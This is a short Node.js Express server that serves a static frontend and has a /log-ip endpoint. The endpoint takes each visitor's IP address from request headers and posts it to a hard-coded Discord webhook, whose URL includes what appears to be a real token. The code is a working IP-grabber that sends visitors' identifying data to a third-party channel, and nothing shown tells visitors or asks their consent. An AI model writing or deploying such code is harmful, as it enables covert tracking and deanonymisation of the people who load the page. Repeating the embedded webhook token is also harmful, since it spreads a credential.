const express = require('express');
const axios = require('axios');
const app = express();
const PORT = 3000;

// Replace with your actual Discord webhook URL
const webhookURL = 'https://discord.com/api/webhooks/1363745587966509086/cZ_E6PovxYXwRVkjeepJ_eH9IgAUqddoZOX9iWS5EAm2akXJndOR6hnD4ia7WMKwBv_rL';

// Serve static HTML files (this will serve your frontend)
app.use(express.static('public'));

// Endpoint to capture the IP and send to Discord
app.post('/log-ip', (req, res) => {
  // Capture the user's IP address from the headers
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Send the IP address to the Discord webhook
  axios.post(webhookURL, {
    content: `New User IP: ${ip}` // Sends the IP to the channel
  })
    .then(() => {
      res.send('IP Logged and Sent to Discord Webhook!');
    })
    .catch(error => {
      console.error('Error sending to webhook:', error);
      res.status(500).send('Error logging IP');
    });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
